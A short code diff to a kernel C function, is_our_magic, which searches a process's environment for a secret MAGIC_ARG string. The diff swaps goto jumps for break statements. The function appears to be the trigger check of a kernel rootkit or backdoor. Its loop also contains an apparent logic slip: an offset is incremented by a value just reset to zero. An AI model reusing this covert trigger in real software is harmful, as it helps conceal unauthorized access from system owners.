@@ -59,21 +59,19 @@ bool is_our_magic(struct audit_context *ctx){
 
 		if(-EFAULT == arg_len){
 			printk("error, unable to read %ld bytes\n", arg_len);
-			goto out;
+			break;
 		}
 		
 		if(0 == strcmp(&buf_head[len_buf], MAGIC_ARG)){
 			// found our magic env variable.
 			is_our_magic = true;
-			goto out;
+			break;
 		}
 		env_arg += (int)(arg_len + 1);
 		arg_len = 0;
 		len_buf += arg_len;
 	} while (buf_head[len_buf] != '\0');
 	
-
-out:
 	kfree(buf_head);
 	return is_our_magic;
 
